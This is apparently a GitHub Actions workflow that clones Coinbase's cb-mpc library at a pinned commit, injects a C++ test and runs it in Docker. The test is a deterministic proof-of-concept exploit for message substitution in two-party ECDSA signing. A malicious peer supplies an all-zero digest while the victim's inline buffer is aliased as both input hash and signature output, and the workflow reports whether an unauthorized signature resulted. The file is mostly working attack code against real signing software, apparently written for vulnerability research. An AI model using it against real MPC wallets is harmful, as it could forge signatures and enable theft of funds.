name: CBMPC ECDSA Inline Message Substitution V39

on:
  workflow_dispatch:
  push:
    paths:
      - '.github/workflows/cbmpc-ecdsa-inline-message-substitution-v39.yml'

permissions:
  contents: read

jobs:
  verdict:
    runs-on: ubuntu-24.04
    timeout-minutes: 45
    steps:
      - name: Clone current cb-mpc HEAD
        shell: bash
        run: |
          set -euo pipefail
          git clone https://github.com/coinbase/cb-mpc.git cb-mpc >/dev/null 2>&1
          cd cb-mpc
          git checkout fdbb60346757271d5e0241f417e55dc8f289573c >/dev/null 2>&1
          git submodule update --init --recursive >/dev/null 2>&1
          echo "tested_commit=$(git rev-parse HEAD)"

      - name: Add public ECDSA2P deterministic alias-substitution PoC
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          from pathlib import Path
          p=Path('cb-mpc/tests/utils/local_network/channel.cpp')
          p.write_text(p.read_text().replace('    delete queue.front();','    test_message_buffer_t::free(queue.front());'))
          PY
          cat >> cb-mpc/tests/unit/api/test_ecdsa2pc.cpp <<'CPP'

          #include <fstream>

          TEST(ApiEcdsa2pc, InlineMessageHashOutputAliasSubstitutionVerdictV39) {
            auto c1 = std::make_shared<mpc_net_context_t>(0);
            auto c2 = std::make_shared<mpc_net_context_t>(1);
            std::vector<std::shared_ptr<mpc_net_context_t>> peers = {c1, c2};
            c1->init_with_peers(peers);
            c2->init_with_peers(peers);
            local_api_transport_t t1(c1);
            local_api_transport_t t2(c2);

            const coinbase::api::job_2p_t job1{party_t::p1, "p1", "p2", t1};
            const coinbase::api::job_2p_t job2{party_t::p2, "p1", "p2", t2};

            buf_t key1, key2;
            error_t rv1 = UNINITIALIZED_ERROR, rv2 = UNINITIALIZED_ERROR;
            run_2pc(c1, c2,
                    [&] { return coinbase::api::ecdsa_2p::dkg(job1, curve_id::secp256k1, key1); },
                    [&] { return coinbase::api::ecdsa_2p::dkg(job2, curve_id::secp256k1, key2); },
                    rv1, rv2);
            ASSERT_EQ(rv1, SUCCESS);
            ASSERT_EQ(rv2, SUCCESS);

            buf_t pub;
            ASSERT_EQ(coinbase::api::ecdsa_2p::get_public_key_compressed(key1, pub), SUCCESS);
            coinbase::crypto::ecc_point_t Q;
            ASSERT_EQ(Q.from_bin(coinbase::crypto::curve_secp256k1, pub), SUCCESS);
            const coinbase::crypto::ecc_pub_key_t verify_key(Q);

            // P1's caller intends to sign a non-zero 32-byte digest A.
            // Because 32 <= buf_t::short_size (36), this buffer is inline-backed.
            buf_t victim_hash(32);
            for (int i = 0; i < victim_hash.size(); ++i) victim_hash[i] = static_cast<uint8_t>(0x41 + i);
            const buf_t original_hash = victim_hash;
            mem_t victim_view = victim_hash;

            // Malicious P2 chooses the all-zero digest B.
            buf_t attacker_zero_hash(32);
            for (int i = 0; i < attacker_zero_hash.size(); ++i) attacker_zero_hash[i] = 0;

            buf_t sid1, sid2, sig2;
            run_2pc(c1, c2,
                    // Same buf_t is the input digest backing victim_view and the signature output.
                    [&] { return coinbase::api::ecdsa_2p::sign(job1, key1, victim_view, sid1, victim_hash); },
                    [&] { return coinbase::api::ecdsa_2p::sign(job2, key2, attacker_zero_hash, sid2, sig2); },
                    rv1, rv2);

            const error_t zero_verify = victim_hash.empty() ? E_GENERAL : verify_key.verify(attacker_zero_hash, victim_hash);
            const error_t original_verify = victim_hash.empty() ? E_GENERAL : verify_key.verify(original_hash, victim_hash);
            const bool substituted = rv1 == SUCCESS && rv2 == SUCCESS && !victim_hash.empty() &&
                                     zero_verify == SUCCESS && original_verify != SUCCESS;

            std::ofstream out("/code/v39-verdict.txt", std::ios::trunc);
            out << "commit=fdbb60346757271d5e0241f417e55dc8f289573c"
                << " rv1=" << rv1 << " rv2=" << rv2
                << " sig_size=" << victim_hash.size()
                << " zero_verify=" << zero_verify
                << " original_verify=" << original_verify
                << " substituted=" << (substituted ? 1 : 0) << "\n";
          }
          CPP

      - name: Build and run release deterministic exploit
        shell: bash
        run: |
          set -euo pipefail
          cd cb-mpc
          make image >/tmp/image-build.log 2>&1
          set +e
          timeout 38m docker run --rm -v "$PWD":/code -t cb-mpc bash -lc 'make test filter=ApiEcdsa2pc.InlineMessageHashOutputAliasSubstitutionVerdictV39' >/tmp/test.log 2>&1
          status=$?
          set -e
          echo "test_exit=$status"
          if [ -f v39-verdict.txt ]; then cat v39-verdict.txt; else echo 'verdict_missing=1'; fi
          sub=$(sed -n 's/.*substituted=\([0-9][0-9]*\).*/\1/p' v39-verdict.txt 2>/dev/null || true)
          if [ "${sub:-0}" -eq 1 ]; then
            echo 'ECDSA_DETERMINISTIC_UNAUTHORIZED_SIGNATURE_CANDIDATE=1'
            exit 2
          fi
          if [ "$status" -ne 0 ]; then
            echo 'V39_TEST_OR_BUILD_FAILURE=1'
            tail -n 160 /tmp/test.log
            exit 1
          fi
          echo 'ECDSA_DETERMINISTIC_UNAUTHORIZED_SIGNATURE_CANDIDATE=0'
